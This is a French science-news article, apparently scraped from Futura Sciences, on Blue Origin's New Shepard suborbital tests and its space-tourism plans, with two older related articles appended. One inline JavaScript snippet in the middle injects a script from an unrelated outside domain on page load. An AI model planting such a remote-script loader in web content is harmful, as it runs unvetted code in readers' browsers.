{"title": "Vols habites : Blue Origin reprend ses essais de tourisme suborbital", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-12-12", "content": "L'exuberance d'Elon Musk tranche avec la discretion de Jeff Bezos, le patron d'Amazon et de Blue Origin. Depuis le dernier essai du New Shepard, un systeme de transport suborbital pour des vols habites a la frontiere de l'espace (sans mise en orbite), plus d'un an s'est ecoule sans que la societe Blue Origin communique sur l'avancement du programme. Il y a quelques jours, nous avons appris que ces essais allaient reprendre. Ce sera l'occasion de mesurer le travail accompli depuis le dernier vol du New Shepard.  D'apres des informations fournies par la FAA (l'autorite americaine de regulation de l'aviation civile), la societe Blue Origin s'appreterait a reprendre les essais suborbitaux du New Shepard, apres une interruption d'un an. Un porte-parole de l'entreprise a confirme au site d'informations  SpaceNews  etre a l'origine de cette demande mais n'a pas fourni de details sur la nature des activites prevues. Dans son  avis , la FAA annonce qu'elle va <<  fermer l'espace aerien au-dessus du site d'essai de Blue Origin entre le 11 et le 14 decembre, chaque jour entre 9 h 30 et 16 h  >>. Cette fermeture vise a <<  fournir un environnement sur pour le lancement et la recuperation d'un  lanceur  >>, lit-on dans ce communique succinct. On peut supposer que cette annee a ete mise a profit pour preparer des essais en prevision d'un vol habite a la frontiere de l'espace dans le courant de l'annee 2018. Concu pour offrir le maximum de visibilite sur l'exterieur, l'habitacle de la capsule New Shepard compte six sieges fixes en position horizontale qui disposent chacun d'un large hublot. (c) Blue Origin                               La vraie capsule devrait voler Cette reprise des vols d'essais intervient dans un contexte favorable au programme de developpement du New Shepard qui, rappelons-le, vise le  marche touristique des vols habites  a la frontiere de l'espace. Il s'agit seulement d'un vol parabolique, qui amene l'engin au-dessus de l'atmosphere a  vitesse  faible, pour un court spectacle avant la redescente vers le sol. L'energie demandee au lanceur est donc bien moindre que celle exigee par une mise en  orbite , ou la vitesse doit depasser les 28.000 km/h.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les essais precedents ont valide le concept et les choix technologiques avec un etage de propulsion reutilise a plusieurs reprises. Le  systeme d'ejection d'urgence  a meme ete teste en vol avec succes. Quant a la capsule qui transportera des passagers a environ 100 kilometres, elle a fait l'objet d'un lifting par rapport a la version initiale. Equipee de six sieges et de larges hublots, elle pourra egalement embarquer des experiences scientifiques ou des demonstrateurs de technologies. Si l'on se fie aux declarations faites en septembre 2017 au Congres international d'astronautique d'Adelaide, en Australie, le vol d'essai prevu ces prochains jours utilisera un etage neuf, c'est-a-dire non utilise lors d'un precedent essai. La nouvelle capsule devrait egalement etre testee lors de ce vol. Celle des essais precedents n'avait pas de hublots (leurs emplacements etaient seulement signales par des dessins). On notera que Blue Origin n'a toujours pas annonce de date d'ouverture de son service touristique spatial, ni debute la commercialisation de billets et encore moins fixe un prix de vente. Pour en savoir plus Blue Origin : les vols habites a la frontiere de l'espace debuteront en 2018 Article de  Remy Decourt  publie le 17/04/2017 Si  Virgin Galactic  a longtemps semble detenir les meilleures chances de devenir la premiere societe a commercialiser des vols touristiques suborbitaux, le New Shepard de Blue Origin tient toutes ses promesses. Il pourrait envoyer ses premiers touristes a la frontiere de l'espace d'ici fin 2018 ! Apres cinq vols reussis entre 2015 et 2016 du systeme de lancement  New Shepard , dont un test d' ejection d'urgence de la capsule , la maitrise de la recuperation de ce lanceur  suborbital  et de sa reutilisation etant demontree, la societe Blue Origin se prepare aux vols d'essai habites. Initialement prevus dans le courant de cette annee, ils ont ete repousses a l'annee prochaine. S'exprimant lors du 33 e   Space Symposium , le rendez-vous incontournable de la communaute spatiale internationale et de ses principaux acteurs, institutionnels, militaires et commerciaux qui s'est deroule du 3 au 6 avril a Colorado Springs (Etats-Unis), Jeff Bezos, le patron de Blue Origin, s'est voulu plutot rassurant sur ce retard. Un vehicule multi-usage ? Il a annonce que le premier vol suborbital touristique pourrait etre realise des 2018. La commercialisation des billets devrait commencer vraisemblablement des que les premiers vols d'essai habites auront ete realises et qu'ils auront donnes satisfaction. Blue Origin n'a pas encore fixe de prix, mais on peut raisonnablement penser qu'il se situera entre 100.000 et 200.000 dollars. Lors de ce symposium, Bezos a precise que le New Shepard, en plus de servir de vehicule suborbital touristique et d'etre utilise pour des experiences de recherche scientifique et de developpement technologique, pourrait egalement etre converti en petit lanceur de satellite en orbite basse au moyen d'un etage superieur. Il pourrait egalement etre utilise pour lancer un vehicule orbital, en lieu et place de l'actuelle capsule touristique. Le saviez-vous ?  Le tourisme spatial a bien du mal a decoller. Des 26 projets en developpement, recenses apres que Richard Branson remportait l'Ansari X Prize qui recompensait la premiere societe capable de faire voler un vehicule habite a 100 km d'altitude, et ce, a deux reprises (octobre 2004), seuls six sont encore en activite.   Le marche des vols suborbitaux ou a la frontiere de l'espace est evalue a quelque 60.000 vols par an au prix de 200.000 dollars le billet.   La fortune de Jeff Bezos, patron d'Amazon, est estimee a 75 milliards de dollars. Pour financer le developpement de sa societe Blue Origin, il vend pour un milliard de dollars par an de titres Amazon, dont il est le patron-fondateur, . New Sheppard reussit un nouveau vol d'essai Article de Remy decourt publie le 21/06/2016 Et de quatre pour le New Shepard ! La maitrise de la recuperation de ce lanceur suborbital et sa reutilisation etant demontrees, la societe Blue Origin se concentre maintenant sur d'autres aspects du vol. Dimanche soir, le but etait surtout de montrer que la capsule pouvait retourner se poser sur la  terre  ferme en securite avec seulement deux  parachutes , au lieu des trois necessaires a une descente et un atterrissage paisibles. Le lanceur suborbital New Shepard de  Blue Origin  a de nouveau reussi un vol d'essai, dimanche au Texas (Etats-Unis). Il s'agissait de la quatrieme fois depuis la premiere tentative survenue en avril 2015 et qui s'etait soldee par le crash de l'appareil. Cette fois-ci, comme les trois vols precedents, tout s'est deroule a merveille avec un decollage et un  atterrissage de precision . La capsule du New Shepard est montee a une centaine de kilometres, altitude qui marque artificiellement la frontiere de l'espace, puis s'est separee du lanceur suborbital. Le principal interet de ce vol d'essai n'etait pas de verifier une nouvelle fois que  Blue Origin  maitrise la recuperation de son lanceur suborbital. Il s'agissait de tester la descente de la capsule, qui s'est faite en mode volontairement degrade, avec deux parachutes au lieu de trois. A travers cet essai, Blue Origin souhaitait voir le comportement de la capsule en cas de probleme, puisqu'elle est destinee, a terme, a accueillir jusqu'a six passagers lors de  vols suborbitaux touristiques  que compte proposer l'entreprise. Bonne nouvelle pour les futurs touristes : bien que le contact avec le sol ait ete un peu rude, la capsule n'a pas subi de dommages structuraux.  << Ingenierie minutieuse plus, bien sur... mes bottes porte-bonheur. La mission a ete un succes >> ,  a tweete  peu apres Jeff Bezos, fondateur de la societe, avec une photo de ses santiags, pour saluer la performance de son systeme de vol suborbital. Le lanceur suborbital de retour de son vol d'essai. (c) Blue Origin                               Tourisme spatial : des Hommes a bord de la capsule en 2017 Lors d'un prochain vol, la capsule sera de nouveau testee dans un mode de fonctionnement inhabituel. A une vitesse transsonique, ses moteurs seront mis en route pour l'ejecter le plus loin possible du lanceur New Shepard. L'entreprise Blue Origin demontrera ensuite qu'elle est capable de la ramener en toute securite au sol. Quant a un premier vol avec des pilotes d'essai, il n'est pas prevu avant le courant de l'annee prochaine. Le systeme New Shepard a vole quatre fois, en avril 2015, novembre 2015, janvier 2016 et avril 2016. Bien qu'il soit concu pour etre reutilise a  plusieurs reprises , ce lanceur a besoin d'une remise en etat a minima entre deux vols. Celle-ci concerne la reparation du systeme de protection thermique, le remplacement des structures deformables et le reemballage des parachutes. Entre chaque vol, etant donne que les ingenieurs en apprennent a chaque fois un peu plus sur le comportement du systeme de lancement, des mises a jour des  logiciels  sont egalement realisees pour introduire de nouvelles fonctionnalites. ", "theme": "sciences"}